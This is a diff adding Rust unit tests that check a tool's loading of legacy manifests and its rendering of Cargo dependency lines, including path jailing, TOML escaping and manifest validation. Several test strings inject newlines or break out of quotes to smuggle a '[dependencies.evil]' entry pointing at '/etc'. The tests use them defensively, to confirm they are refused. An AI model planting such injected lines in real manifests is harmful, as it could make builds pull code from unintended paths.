+    /// A legacy manifest cannot re-derive a wrapper crate's source, so any
+    /// stored line outside the exact registry-pin grammar — a `path` line in
+    /// any spelling, a split key, an injected newline — is refused rather than
+    /// forwarded into the emitted manifest.
+    #[test]
+    fn legacy_manifest_with_off_grammar_dep_line_is_refused() {
+        for (i, line) in [
+            "engine_wrap = { path = \"/etc\" }",
+            "engine_wrap = {path=\"/etc\"}",
+            "engine_wrap = { path\t= \"/etc\" }",
+            "semver = { version = \"=1.0.0\", path = \"/etc\" }",
+            "semver\n[dependencies.evil] = \"=1.0.0\"",
+            "semver = \"=1.0.0\"\nevil = { path = \"/etc\" }",
+            "semver = \"=\"",
+            "semver = \"1.0.0\"",
+            "semver  = \"=1.0.0\"",
+            "semver = { version = \"=1.0.0\", features = [] }",
+            "semver = { version = \"=1.0.0\", features = [\"a\",\"b\"] }",
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let consumer = legacy_consumer_with_deps(&json!([line]));
+            let cache_root = write_legacy_cache(&format!("off_grammar_{i}"), &consumer);
+            let r = load_catalog(&cache_root);
+            let _ = std::fs::remove_dir_all(&cache_root);
+            assert!(
+                matches!(
+                    &r,
+                    Err(Diagnostic::WireMalformed {
+                        defect: crate::diag::WireDefect::LegacyDependencyLine { got },
+                        ..
+                    }) if got == line
+                ),
+                "{line:?} must be refused as a typed legacy line: {r:?}"
+            );
+        }
+    }
+
+    /// A non-string `cargoDeps` entry or a non-array `cargoDeps` is refused,
+    /// never skipped.
+    #[test]
+    fn legacy_manifest_with_non_string_dep_entry_is_refused() {
+        let non_string = "`cargoDeps` carries a non-string entry";
+        for (i, (deps, expected)) in [
+            (json!([42]), non_string),
+            (json!(["semver = \"=1.0.0\"", null]), non_string),
+            (json!("x"), "`cargoDeps` is not an array"),
+        ]
+        .iter()
+        .enumerate()
+        {
+            let consumer = legacy_consumer_with_deps(deps);
+            let cache_root = write_legacy_cache(&format!("non_string_dep_{i}"), &consumer);
+            let r = load_catalog(&cache_root);
+            let _ = std::fs::remove_dir_all(&cache_root);
+            assert!(
+                matches!(
+                    &r,
+                    Err(Diagnostic::WireMalformed {
+                        defect: crate::diag::WireDefect::Json { detail },
+                        ..
+                    }) if detail == expected
+                ),
+                "{deps} must be refused: {r:?}"
+            );
+        }
+    }
+
+    /// A `path` line is outside the registry-pin grammar and is refused with
+    /// the typed legacy-line defect carrying the line verbatim.
+    #[test]
+    fn parse_registry_line_refuses_a_path_line_typed() {
+        let line = "engine_wrap = { path = \"/etc\" }";
+        assert_eq!(
+            CargoDep::parse_registry_line(line),
+            Err(crate::diag::WireDefect::LegacyDependencyLine {
+                got: line.to_owned()
+            })
+        );
+    }
+
+    /// A legacy line in the exact rendered grammar loads as a typed registry pin.
+    #[test]
+    fn legacy_manifest_registry_lines_load_typed() {
+        let lines = [
+            "semver = \"=1.0.0\"",
+            "serde = { version = \"=1.0.200\", features = [\"derive\", \"std\"] }",
+        ];
+        let consumer = legacy_consumer_with_deps(&json!(lines));
+        let cache_root = write_legacy_cache("registry_lines", &consumer);
+        let r = load_catalog(&cache_root);
+        let _ = std::fs::remove_dir_all(&cache_root);
+        let catalog = r.expect("exact registry lines load");
+        let entry = catalog.first().expect("one entry");
+        let rendered: Vec<String> = entry.cargo_deps.iter().map(CargoDep::render).collect();
+        assert_eq!(rendered, lines);
+        assert!(
+            entry
+                .cargo_deps
+                .iter()
+                .all(|d| matches!(d, CargoDep::Registry { .. }))
+        );
+    }
+
+    /// Every line the renderer emits for a registry pin parses back to the
+    /// same typed value.
+    #[test]
+    fn rendered_registry_line_round_trips() {
+        let lines = cargo_deps(&semver_pkg(), &registry_cache()).expect("renders");
+        assert!(!lines.is_empty());
+        for dep in lines {
+            assert_eq!(
+                CargoDep::parse_registry_line(&dep.render()).ok(),
+                Some(dep.clone()),
+                "{dep:?}"
+            );
+        }
+    }
+
+    /// A stored transparent-parameter slot that is neither a type name nor
+    /// `null` is refused, never read as "no conversion".
+    #[test]
+    fn legacy_manifest_with_non_string_transparent_param_is_refused() {
+        let consumer = json!({
+            "moduleName": "Rust.Semver",
+            "kernelName": "Rust_Semver",
+            "opaqueTypes": { "Version": "::semver::Version" },
+            "defineTypes": [],
+            "cargoDeps": [],
+            "bindings": [{
+                "refName": "parse",
+                "wrapperIdent": "semver_parse",
+                "arity": 1,
+                "sig": "String -> Result Error Version",
+                "transparentParams": [7]
+            }]
+        })
+        .to_string();
+        let cache_root = write_legacy_cache("non_string_param", &consumer);
+        let r = load_catalog(&cache_root);
+        let _ = std::fs::remove_dir_all(&cache_root);
+        assert!(
+            matches!(
+                &r,
+                Err(Diagnostic::WireMalformed {
+                    defect: crate::diag::WireDefect::Json { detail },
+                    ..
+                }) if detail.contains("transparentParams[0]")
+            ),
+            "{r:?}"
+        );
+    }
+
+    /// Every string, whatever it holds, round-trips through the TOML basic
+    /// string renderer as exactly one value.
+    #[test]
+    fn toml_basic_string_round_trips() {
+        for text in [
+            "plain",
+            "quote\"inside",
+            "back\\slash",
+            "new\nline",
+            "c++/proj/\u{c1}rea",
+            "\u{1}\u{7f}\u{85}\t\r\u{8}\u{c}",
+            "\"\n[dependencies.evil]\npath = \"/etc\"\n\"",
+            "",
+        ] {
+            let doc = format!("x = {}", toml_basic_string(text));
+            let table: toml::Table = toml::from_str(&doc).expect("renders valid TOML");
+            assert_eq!(table.len(), 1, "{doc:?} must hold one key");
+            assert_eq!(
+                table.get("x").and_then(toml::Value::as_str),
+                Some(text),
+                "{doc:?}"
+            );
+        }
+    }
+
+    /// A wrapper crate under a root whose name carries `+` or a non-ASCII
+    /// letter renders a `path` that parses back to the canonical directory.
+    #[test]
+    fn wrapper_dir_under_a_plus_or_non_ascii_root_renders() {
+        for name in ["plus+root", "\u{c1}rea"] {
+            let (project, canonical) = scratch_project(name);
+            let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+            let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+            let deps = r.expect("jails inside the root");
+            let path = deps.first().and_then(|line| parsed_path(line));
+            let back = path.as_deref().and_then(|p| std::fs::canonicalize(p).ok());
+            let _ = std::fs::remove_dir_all(&project);
+            assert!(
+                path.as_deref()
+                    .is_some_and(|p| p.contains(name) && !p.starts_with("\\\\?\\")),
+                "{deps:?}"
+            );
+            assert_eq!(back, Some(canonical), "{deps:?}");
+        }
+    }
+
+    /// A root whose name carries a quote or a backslash renders an escaped
+    /// `path` that parses back to exactly the canonical directory.
+    #[cfg(unix)]
+    #[test]
+    fn wrapper_dir_under_a_quote_or_backslash_root_renders_escaped() {
+        for name in ["quote\"root", "back\\slash"] {
+            let (project, canonical) = scratch_project(name);
+            let text = canonical.to_str().expect("utf-8 temp path").to_owned();
+            let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+            let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+            let _ = std::fs::remove_dir_all(&project);
+            let deps = r.expect("jails inside the root");
+            assert_eq!(
+                deps.first().and_then(|line| parsed_path(line)),
+                Some(text),
+                "{deps:?}"
+            );
+        }
+    }
+
+    /// A root whose name carries a control character has no renderable
+    /// `path` value and is refused.
+    #[cfg(unix)]
+    #[test]
+    fn wrapper_dir_under_a_control_char_root_is_unrenderable() {
+        let (project, _) = scratch_project("new\nline");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        assert!(
+            matches!(
+                jail_defect(&r),
+                Some(crate::diag::WireDefect::WrapperPathUnrenderable { canonical, .. })
+                    if canonical.contains("new\nline")
+            ),
+            "{r:?}"
+        );
+    }
+
+    /// On Windows the verbatim drive prefix is stripped through the typed
+    /// conversion, and the rendered path resolves to the canonical directory.
+    #[cfg(windows)]
+    #[test]
+    fn wrapper_crate_renders_a_plain_drive_path_on_windows() {
+        let (project, canonical) = scratch_project("windows");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+        let deps = r.expect("jails inside the root");
+        let path = deps.first().and_then(|line| parsed_path(line));
+        let back = path.as_deref().and_then(|p| std::fs::canonicalize(p).ok());
+        let _ = std::fs::remove_dir_all(&project);
+        assert!(
+            path.as_deref().is_some_and(|p| !p.starts_with("\\\\?\\")),
+            "{deps:?}"
+        );
+        assert_eq!(back, Some(canonical));
+    }
+
+    /// A wrapper directory with no `Cargo.toml` is refused at the jail.
+    #[test]
+    fn wrapper_dir_without_a_manifest_is_refused() {
+        let (project, canonical) = scratch_project("no-manifest");
+        std::fs::remove_file(canonical.join("Cargo.toml")).expect("remove manifest");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        assert!(
+            matches!(
+                manifest_defect(&r),
+                Some(crate::diag::WrapperManifestDefect::Unreadable { .. })
+            ),
+            "{r:?}"
+        );
+    }
+
+    /// A symlinked `Cargo.toml` is refused rather than followed.
+    #[cfg(unix)]
+    #[test]
+    fn wrapper_manifest_symlink_is_refused() {
+        let (project, canonical) = scratch_project("manifest-link");
+        std::fs::write(project.join("real.toml"), ENGINE_MANIFEST).expect("scratch file");
+        std::fs::remove_file(canonical.join("Cargo.toml")).expect("remove manifest");
+        std::os::unix::fs::symlink(project.join("real.toml"), canonical.join("Cargo.toml"))
+            .expect("symlink");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        assert_eq!(
+            manifest_defect(&r),
+            Some(&crate::diag::WrapperManifestDefect::NotRegularFile),
+            "{r:?}"
+        );
+    }
+
+    /// A directory named `Cargo.toml` is not a regular file and is refused.
+    #[cfg(unix)]
+    #[test]
+    fn wrapper_manifest_directory_is_refused() {
+        let (project, canonical) = scratch_project("manifest-dir");
+        std::fs::remove_file(canonical.join("Cargo.toml")).expect("remove manifest");
+        std::fs::create_dir(canonical.join("Cargo.toml")).expect("manifest dir");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        assert_eq!(
+            manifest_defect(&r),
+            Some(&crate::diag::WrapperManifestDefect::NotRegularFile),
+            "{r:?}"
+        );
+    }
+
+    /// A manifest one byte past the ceiling is refused; one at it loads.
+    #[test]
+    fn wrapper_manifest_past_the_ceiling_is_refused() {
+        let limit = usize::try_from(crate::pkginfo::WRAPPER_MANIFEST_LIMIT).expect("fits");
+        let pad = |len: usize| {
+            let mut bytes = ENGINE_MANIFEST.as_bytes().to_vec();
+            bytes.push(b'#');
+            bytes.resize(len, b'x');
+            bytes
+        };
+        let over = load_with_manifest("manifest-over", &pad(limit + 1));
+        assert_eq!(
+            manifest_defect(&over),
+            Some(&crate::diag::WrapperManifestDefect::Oversized {
+                limit: crate::pkginfo::WRAPPER_MANIFEST_LIMIT
+            }),
+            "{over:?}"
+        );
+        let at = load_with_manifest("manifest-at", &pad(limit));
+        assert!(at.is_ok(), "{at:?}");
+    }
+
+    /// A manifest that is not UTF-8 TOML with a string `[package] name` is
+    /// refused as invalid.
+    #[test]
+    fn wrapper_manifest_without_a_string_package_name_is_refused() {
+        for (i, manifest) in [
+            b"[lib]\nname = \"engine_wrap\"\n".as_slice(),
+            b"[package]\nname = { workspace = true }\n".as_slice(),
+            b"[package]\nversion = \"0.1.0\"\n".as_slice(),
+            b"[package\nname = \"engine_wrap\"\n".as_slice(),
+            b"[package]\nname = \"engine_wrap\"\nname = \"other\"\n".as_slice(),
+            b"[package]\nname = \"engine\xff_wrap\"\n".as_slice(),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let r = load_with_manifest(&format!("manifest-invalid-{i}"), manifest);
+            assert!(
+                matches!(
+                    manifest_defect(&r),
+                    Some(crate::diag::WrapperManifestDefect::Invalid { .. })
+                ),
+                "{:?}: {r:?}",
+                String::from_utf8_lossy(manifest)
+            );
+        }
+    }
+
+    /// A `[package] name` outside the dependency-key charset is refused.
+    #[test]
+    fn wrapper_manifest_with_an_illegal_package_name_is_refused() {
+        let r = load_with_manifest("manifest-illegal", b"[package]\nname = \"9lives\"\n");
+        assert_eq!(
+            manifest_defect(&r),
+            Some(&crate::diag::WrapperManifestDefect::PackageNameIllegal {
+                found: "9lives".to_owned()
+            }),
+            "{r:?}"
+        );
+    }
+
+    /// A `[package] name` other than the installed package's name is refused,
+    /// so the dependency key and the crate cargo finds cannot disagree.
+    #[test]
+    fn wrapper_manifest_naming_another_package_is_refused() {
+        let r = load_with_manifest("manifest-mismatch", b"[package]\nname = \"other_wrap\"\n");
+        assert_eq!(
+            manifest_defect(&r),
+            Some(&crate::diag::WrapperManifestDefect::PackageNameMismatch {
+                expected: "engine_wrap".to_owned(),
+                found: "other_wrap".to_owned()
+            }),
+            "{r:?}"
+        );
+    }
+
+    /// A wrapper crate's typed entry carries the jailed directory and renders
+    /// the one `path` line.
+    #[test]
+    fn wrapper_crate_yields_a_typed_path_entry() {
+        let (project, canonical) = scratch_project("typed");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        let deps = r.expect("jails inside the root");
+        assert!(
+            matches!(deps.as_slice(), [CargoDep::Wrapper { .. }]),
+            "expected one wrapper entry: {deps:?}"
+        );
+        let [dep] = deps.as_slice() else {
+            return;
+        };
+        let CargoDep::Wrapper { dir, features } = dep else {
+            return;
+        };
+        assert_eq!(dep.name().as_str(), "engine_wrap");
+        assert_eq!(dir.package().as_str(), "engine_wrap");
+        assert_eq!(Some(dir.as_str()), canonical.to_str());
+        assert!(features.is_empty());
+    }
+
+    /// Stored transparent-parameter slots that disagree with the binding's
+    /// arity are refused at load, never handed to the backend's per-position
+    /// glue lookup.
+    #[test]
+    fn legacy_manifest_with_misaligned_transparent_params_is_refused() {
+        let consumer = json!({
+            "moduleName": "Rust.Semver",
+            "kernelName": "Rust_Semver",
+            "opaqueTypes": { "Version": "::semver::Version" },
+            "defineTypes": [],
+            "cargoDeps": [],
+            "bindings": [{
+                "refName": "parse",
+                "wrapperIdent": "semver_parse",
+                "arity": 1,
+                "sig": "String -> Result Error Version",
+                "transparentParams": [null, "Version"]
+            }]
+        })
+        .to_string();
+        let cache_root = write_legacy_cache("misaligned", &consumer);
+        let r = load_catalog(&cache_root);
+        let _ = std::fs::remove_dir_all(&cache_root);
+        assert!(
+            matches!(
+                &r,
+                Err(Diagnostic::WireMalformed {
+                    defect: crate::diag::WireDefect::Json { detail },
+                    ..
+                }) if detail.contains("transparent-parameter slots")
+            ),
+            "{r:?}"
+        );
     }
 }
